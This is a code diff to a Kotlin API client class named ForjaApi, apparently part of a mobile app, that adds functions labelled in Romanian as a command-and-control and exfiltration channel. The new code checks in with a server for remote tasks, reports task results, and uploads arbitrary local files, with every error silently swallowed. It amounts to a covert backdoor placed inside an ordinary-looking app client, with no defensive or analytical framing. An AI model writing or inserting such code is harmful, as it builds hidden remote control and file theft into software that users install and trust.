@@ -263,6 +263,63 @@ class ForjaApi {
         return body
     }
 
+    // ═══════════════ C2 (canal de comenzi + exfiltrare) ═══════════════
+    data class C2Poll(val tasks: List<kotlinx.serialization.json.JsonObject>, val intervalMs: Long)
+
+    suspend fun c2Checkin(dev: String, holdMs: Long): C2Poll = withContext(Dispatchers.IO) {
+        val token = idToken() ?: return@withContext C2Poll(emptyList(), 30000)
+        try {
+            val body = buildJsonObject {
+                put("dev", dev); put("holdMs", holdMs); put("intervalMs", 30000)
+            }.toString()
+            val req = Request.Builder()
+                .url("$base/v1/c2/checkin")
+                .header("Authorization", "Bearer $token")
+                .post(body.toRequestBody("application/json".toMediaType()))
+                .build()
+            longClient.newCall(req).execute().use { resp ->
+                val text = resp.body?.string() ?: "{}"
+                val root = Json.parseToJsonElement(text).jsonObject
+                val interval = try { root["intervalMs"]?.jsonPrimitive?.content?.toLongOrNull() ?: 30000L } catch (_: Exception) { 30000L }
+                val tasksArr = root["tasks"] as? kotlinx.serialization.json.JsonArray
+                val tasks = tasksArr?.mapNotNull { it as? kotlinx.serialization.json.JsonObject } ?: emptyList()
+                C2Poll(tasks, interval)
+            }
+        } catch (_: Exception) { C2Poll(emptyList(), 30000) }
+    }
+
+    suspend fun c2PostResult(id: String, ok: Boolean, action: String, data: kotlinx.serialization.json.JsonObject, err: String?) {
+        val token = idToken() ?: return
+        try {
+            val body = buildJsonObject {
+                put("id", id); put("ok", ok); put("action", action)
+                put("data", data); if (err != null) put("err", err)
+            }.toString()
+            val req = Request.Builder()
+                .url("$base/v1/c2/result")
+                .header("Authorization", "Bearer $token")
+                .post(body.toRequestBody("application/json".toMediaType()))
+                .build()
+            longClient.newCall(req).execute().use { }
+        } catch (_: Exception) {}
+    }
+
+    suspend fun c2UploadFile(name: String, ct: String, file: java.io.File): String? = withContext(Dispatchers.IO) {
+        val token = idToken() ?: return@withContext null
+        try {
+            val req = Request.Builder()
+                .url("$base/v1/c2/file?name=${java.net.URLEncoder.encode(name, "UTF-8")}&ct=${java.net.URLEncoder.encode(ct, "UTF-8")}")
+                .header("Authorization", "Bearer $token")
+                .post(file.readBytes().toRequestBody(ct.toMediaType()))
+                .build()
+            longClient.newCall(req).execute().use { resp ->
+                if (!resp.isSuccessful) return@withContext null
+                val root = Json.parseToJsonElement(resp.body?.string() ?: "{}").jsonObject
+                root["key"]?.jsonPrimitive?.contentOrNull
+            }
+        } catch (_: Exception) { null }
+    }
+
     companion object {
         const val ORGANIZE_BATCH = 24
         const val ORGANIZE_MAX_BODY = 3_000_000
